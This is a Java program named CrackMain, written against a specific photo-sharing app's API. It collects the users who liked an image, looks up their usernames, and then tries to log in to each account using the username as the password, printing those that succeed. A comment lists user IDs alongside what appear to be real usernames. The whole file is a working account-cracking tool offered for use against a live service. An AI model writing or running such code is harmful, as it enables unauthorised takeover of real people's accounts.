package net.lqm.main;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import net.lqm.util.HttpUtils;

public class CrackMain {
	public static void main(String[] args) {
		//61066=michlie;61271=柠檬爸爸;61010=wangjunling3
		for(String userId : getFavoriteUsers("61271")) {
			String name = getUserName(userId);
			String str = loginWeApp(name);
			if(str!=null) {
				System.out.println(str);
			}
		}
	}
	
	private static List<String> getFavoriteUsers(String imageId) {
		List<String> returnList = new ArrayList<String>();
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/favoriteUsers";
		String param = "{\"parameters\":{\"is_all\":\"1\",\"image_id\":\""+imageId+"\"}}";
		
		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);
		String userListStr = map.get("content").get("favorite_users")+"";
		JSONArray users = (JSONArray)JSON.parse(userListStr);
		for(Object user : users) {
			JSONObject jo = (JSONObject) JSONObject.toJSON(user);
			returnList.add(jo.get("user_id").toString());
		}
		return returnList;
	}
	
	private static String getUserName(String userId) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/otherPublishes";
		String param = "{\"parameters\":{\"user_id\":\""+userId+"\"}}";
		
		String res = HttpUtils.sendPost(url, param);
		JSONObject jo = JSON.parseObject(res);
		JSONObject content = (JSONObject)jo.get("content");
		JSONObject userinfo = (JSONObject)content.get("user_info");
		
		return userinfo.get("username")+"";
	}
	
	private static String loginWeApp(String user) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/user/login";
		String param = "{\"parameters\":{\"version\":\"1.3.0\",\"username\":\"" + user + "\",\"password\":\""+user+"\"}}";

		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);

		try {
			map.get("content").get("token").toString();
			return user;
		} catch (Exception e) {
			System.out.println("password is wrong： "+user);
		}
		return null;
	}
}
